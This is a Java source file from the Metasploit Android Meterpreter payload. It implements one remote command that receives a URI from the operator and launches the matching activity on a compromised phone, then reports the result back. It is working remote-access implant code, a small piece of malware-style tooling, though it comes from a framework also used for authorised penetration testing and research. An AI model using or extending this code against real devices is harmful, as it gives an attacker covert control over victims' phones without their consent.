package com.metasploit.meterpreter.android;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsManager;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

import java.net.URISyntaxException;


public class activity_start_android implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_URI_STRING = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9101);
    private static final int TLV_TYPE_ACTIVITY_START_RESULT = TLVPacket.TLV_META_TYPE_BOOL | (TLV_EXTENSIONS + 9102);

    private boolean startIntent(Context context, String uri) {
        try {
            Intent intent = Intent.getIntent(uri);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            return true;
        } catch (ActivityNotFoundException e) {
            return false;
        } catch (URISyntaxException e) {
            return false;
        }
    }

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        String uri = request.getStringValue(TLV_TYPE_URI_STRING);
        final Context context = AndroidMeterpreter.getContext();
        if (context == null) {
            return ERROR_FAILURE;
        }
        response.addOverflow(TLV_TYPE_ACTIVITY_START_RESULT, startIntent(context, uri));
        return ERROR_SUCCESS;
    }
}
